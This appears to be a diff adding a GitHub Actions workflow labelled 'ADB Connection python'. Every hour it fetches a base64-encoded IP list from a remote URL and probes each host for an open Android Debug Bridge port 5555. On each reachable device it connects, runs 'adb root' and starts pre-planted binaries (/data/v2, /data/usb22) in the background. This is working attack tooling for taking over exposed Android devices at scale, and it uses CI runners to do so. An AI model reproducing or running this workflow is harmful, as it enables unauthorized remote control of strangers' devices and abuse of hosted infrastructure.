@@ -1,0 +1,113 @@
+name: ADB Connection python
+
+on:
+  schedule:
+    - cron: '0 * * * *' # 每小时运行一次
+  workflow_dispatch: # 手动触发
+
+jobs:
+  adb-test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout the repository
+      uses: actions/checkout@v2
+
+    - name: Install Telnet, ADB, and Python
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y telnet adb curl python3 python3-pip
+
+    - name: Download the 1.txt file from URL
+      id: download_file
+      run: |
+        curl -o 1.txt https://raw.githubusercontent.com/Janit8r/device_lge_judyln/S/1.txt
+
+    - name: Decode IPs from 1.txt (Base64) and Test Ports
+      id: test_ports
+      run: |
+        # Create a Python script to handle the IP processing
+        cat <<EOF > process_ips.py
+import base64
+import subprocess
+
+def test_port(ip, port):
+    try:
+        result = subprocess.run(['timeout', '5', 'bash', '-c', f"echo > /dev/tcp/{ip}/{port}"], capture_output=True, text=True)
+        return result.returncode == 0
+    except Exception as e:
+        print(f"Error testing port {port} on IP {ip}: {e}")
+        return False
+
+def main():
+    # Read and decode IPs
+    with open('1.txt', 'r') as file:
+        base64_ips = file.readlines()
+
+    decoded_ips = [base64.b64decode(ip.strip()).decode('utf-8') for ip in base64_ips]
+
+    reachable_ips = []
+
+    # Test each IP
+    for ip in decoded_ips:
+        if test_port(ip, 7500):
+            print(f"{ip}:7500 is open, skipping.")
+        else:
+            print(f"{ip}:7500 is not open, testing 5555...")
+            if test_port(ip, 5555):
+                print(f"{ip}:5555 is open, adding to reachable IPs.")
+                reachable_ips.append(ip)
+            else:
+                print(f"{ip}:5555 is not reachable within 5 seconds, skipping.")
+
+    # Write reachable IPs to a file
+    with open('reachable_ips.txt', 'w') as file:
+        for ip in reachable_ips:
+            file.write(f"{ip}\n")
+
+    print("Collected reachable IPs:")
+    for ip in reachable_ips:
+        print(ip)
+
+if __name__ == "__main__":
+    main()
+EOF
+
+    - name: Run Python script to process IPs
+      run: |
+        python3 process_ips.py
+
+    - name: Execute ADB commands on reachable IPs
+      run: |
+        # Create a Python script to handle ADB commands
+        cat <<EOF > execute_adb_commands.py
+import subprocess
+
+def execute_adb_commands(ip):
+    try:
+        print(f"Connecting to IP: {ip}")
+        subprocess.run(['adb', 'connect', f"{ip}:5555"], check=True)
+        subprocess.run(['adb', '-s', f"{ip}:5555", 'root'], check=True)
+        subprocess.run(['adb', '-s', f"{ip}:5555", 'shell', 'sh', '-c', '/data/v2 run > /dev/null 2> /data/error.log &'], check=True)
+        subprocess.run(['adb', '-s', f"{ip}:5555", 'shell', 'sh', '-c', '/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &'], check=True)
+        subprocess.run(['adb', 'disconnect', f"{ip}:5555"], check=True)
+        print(f"Commands executed on {ip}:5555")
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing commands on {ip}: {e}")
+
+def main():
+    # Read reachable IPs
+    with open('reachable_ips.txt', 'r') as file:
+        ips = file.readlines()
+
+    for ip in ips:
+        ip = ip.strip()
+        execute_adb_commands(ip)
+
+if __name__ == "__main__":
+    main()
+EOF
+
+    - name: Run Python script to execute ADB commands
+      run: |
+        python3 execute_adb_commands.py
